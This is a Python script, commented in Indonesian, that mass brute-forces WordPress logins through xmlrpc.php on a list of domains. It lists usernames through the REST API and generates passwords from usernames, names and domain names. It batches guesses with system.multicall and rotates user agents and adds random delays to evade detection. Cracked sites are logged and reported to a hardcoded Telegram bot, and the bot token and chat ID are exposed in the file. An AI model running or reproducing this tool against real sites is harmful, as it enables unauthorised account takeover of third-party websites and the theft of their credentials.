import requests
import concurrent.futures
import urllib3
import sys
import random
import time
from datetime import datetime
from requests.exceptions import ConnectTimeout, ReadTimeout, ConnectionError, RequestException

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI UTAMA ---
INPUT_FILE = 'list_domain.txt'
OUTPUT_FILE = 'pwned_results.txt'
THREADS = 15
TIMEOUT = 25
BATCH_SIZE = 40        # Ukuran paket
JITTER_MIN = 0.5       # Delay minimal
JITTER_MAX = 2.0       # Delay maksimal

# --- KONFIGURASI TELEGRAM (SUDAH DIISI) ---
TELEGRAM_TOKEN = "7994121895:AAEAr83U4UreqI7f0qsyFPzBUOkYOFaCvVY"
TELEGRAM_CHAT_ID = "6602672328"

IGNORED_SUBDOMAINS = ['cpanel', 'webmail', 'whm', 'webdisk', 'autodiscover', 'cpcalendars']

# --- WARNA TERMINAL ---
class Col:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    GREY = '\033[90m'
    RESET = '\033[0m'

# --- FUNGSI NOTIFIKASI ---
def send_telegram_alert(domain, user, password_info):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID: return
    
    # Escape karakter markdown yang sensitif jika perlu, tapi text biasa aman
    msg = (f"🔥 *WP CRACKED (Multi-Path)* 🔥\n\n"
           f"🌐 *Target:* `{domain}`\n"
           f"👤 *User:* `{user}`\n"
           f"🔑 *Pass:* `{password_info}`")
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=5)
    except: pass

def log(msg, status="INFO"):
    now = datetime.now().strftime("%H:%M:%S")
    colors = {"SUCCESS": Col.GREEN, "FAIL": Col.RED, "WARN": Col.YELLOW, "SKIP": Col.GREY, "INFO": Col.CYAN}
    print(f"{colors.get(status, Col.RESET)}[{status[0]}] [{now}] {msg}{Col.RESET}")

# --- ROTASI HEADER ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
]

def get_headers(target_url):
    try: domain = target_url.split('/')[2]
    except: domain = target_url
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'text/xml', 'Connection': 'keep-alive',
        'Referer': target_url, 'Origin': f"https://{domain}"
    }

# --- LOGIKA PASSWORD GENIUS ---
def generate_genius_passwords(user_data, target_url):
    # Parsing Domain
    clean_url = target_url.replace("http://", "").replace("https://", "").rstrip("/")
    # Jika URL mengandung path (misal domain.com/wp), ambil domain utamanya saja untuk password
    domain_only = clean_url.split('/')[0]
    domain_parts = domain_only.split('.')
    domain_name = domain_parts[0] if len(domain_parts) > 0 else domain_only

    slug = user_data.get('slug', '').lower()
    real_name = user_data.get('name', '').lower()
    
    bases = set([slug, slug.capitalize(), domain_name, domain_name.capitalize()])
    
    # Nama Asli
    if real_name and real_name != slug:
        parts = real_name.split()
        for p in parts:
            if len(p) > 2:
                bases.add(p)
                bases.add(p.capitalize())
        bases.add(real_name.replace(" ", ""))

    current_year = datetime.now().year
    years = [str(current_year), str(current_year-1), str(current_year-2)]

    separators = ["", "@", "#", "!", "_", "-"]
    suffixes = ["1", "12", "123", "1234", "12345"] + years

    passwords = []
    for base in bases:
        passwords.append(base)
        for sep in separators:
            for suf in suffixes:
                passwords.append(f"{base}{sep}{suf}")

    static_passwords = [
        "password", "123456", "12345678", "qwerty", "1234567890", 
        "admin123", "admin@123", "password123", "pass123", "admin",
        "welcome", "login", "master", "server", "webmaster"
    ]
    passwords.extend(static_passwords)
    passwords.append(domain_only) 
    
    return list(set(passwords))

# --- RECONNAISSANCE & UTILITAS ---
def check_xmlrpc_existence(full_url):
    """Cek URL spesifik (bukan cuma base domain)"""
    try:
        r = requests.get(full_url, headers=get_headers(full_url), timeout=10, verify=False)
        if r.status_code == 404:
            return False
        return True
    except:
        return False

def get_users_deep(wp_root_url):
    """Ambil user dari WP-JSON (sesuaikan dengan root path yang ditemukan)"""
    users = []
    try:
        api_url = f"{wp_root_url}/wp-json/wp/v2/users"
        r = requests.get(api_url, headers=get_headers(wp_root_url), timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            data = r.json()
            for u in data:
                users.append({'slug': u.get('slug', ''), 'name': u.get('name', '')})
    except: pass
    
    if not users:
        users.append({'slug': 'admin', 'name': ''})
        users.append({'slug': 'administrator', 'name': ''})
    return users

def build_multicall(username, passwords):
    calls = ""
    for pwd in passwords:
        safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        calls += f"<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{username}</string></value><value><string>{safe_pass}</string></value></data></array></value></member>"
    return f"<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>"

def attack_domain(domain_raw):
    # Filter Subdomain
    raw_clean = domain_raw.replace('http://', '').replace('https://', '').strip('/')
    for sub in IGNORED_SUBDOMAINS:
        if raw_clean.startswith(f"{sub}."): return

    # Normalize Base URL
    target_base = domain_raw.strip().rstrip('/')
    if not target_base.startswith('http'): target_base = 'https://' + target_base

    # --- DETEKSI JALUR XMLRPC (MULTI-PATH) ---
    # Kita cek kedua path: /xmlrpc.php DAN /wp/xmlrpc.php
    possible_paths = ["/xmlrpc.php", "/wp/xmlrpc.php"]
    valid_xml_url = None
    
    for path in possible_paths:
        candidate_url = f"{target_base}{path}"
        if check_xmlrpc_existence(candidate_url):
            valid_xml_url = candidate_url
            break # Ketemu satu, langsung pakai
            
    if not valid_xml_url:
        return # Skip jika tidak ada di kedua lokasi

    # Tentukan Root URL WordPress berdasarkan lokasi xmlrpc yang ketemu
    # Jika ketemu di /wp/xmlrpc.php, maka root usernya di /wp/wp-json
    wp_root = valid_xml_url.replace("/xmlrpc.php", "")
    
    # --- RECON USER (Pakai wp_root yang benar) ---
    users_data = get_users_deep(wp_root)
    found_slugs = [u['slug'] for u in users_data]
    
    # Info path mana yang dipakai
    log(f"Target: {valid_xml_url} | Users: {found_slugs}", "INFO")

    # --- ATTACK LOOP ---
    for user_obj in users_data:
        user_slug = user_obj['slug']
        # Generate password menggunakan URL root agar pattern domainnya benar
        pass_list = generate_genius_passwords(user_obj, wp_root)
        
        for i in range(0, len(pass_list), BATCH_SIZE):
            chunk = pass_list[i : i + BATCH_SIZE]
            payload = build_multicall(user_slug, chunk)
            
            time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))
            
            try:
                r = requests.post(valid_xml_url, data=payload, headers=get_headers(valid_xml_url), timeout=TIMEOUT, verify=False)
                
                if r.status_code == 200:
                    if "isAdmin" in r.text or "blogName" in r.text:
                        log(f"CRACKED: {valid_xml_url} | User: {user_slug}", "SUCCESS")
                        
                        result_line = f"{valid_xml_url}|{user_slug}|(Genius)"
                        with open(OUTPUT_FILE, 'a') as f:
                            f.write(result_line + "\n")
                        
                        send_telegram_alert(valid_xml_url, user_slug, "Genius Pass List")
                        return 
                elif r.status_code in [403, 406, 500]:
                    if i == 0: log(f"WAF/Error ({r.status_code}) at {valid_xml_url}", "WARN")
                    break 
            except: pass

def main():
    print(f"{Col.CYAN}--- WP GENIUS BRUTE (Multi-Path /wp/) ---{Col.RESET}")
    print(f"Telegram Configured: YES")
    print(f"Checking: /xmlrpc.php AND /wp/xmlrpc.php")
    
    try:
        with open(INPUT_FILE, 'r') as f: domains = f.read().splitlines()
    except: 
        print(f"File {INPUT_FILE} not found.")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(attack_domain, domains)
    print("\n[DONE]")

if __name__ == "__main__":
    main()
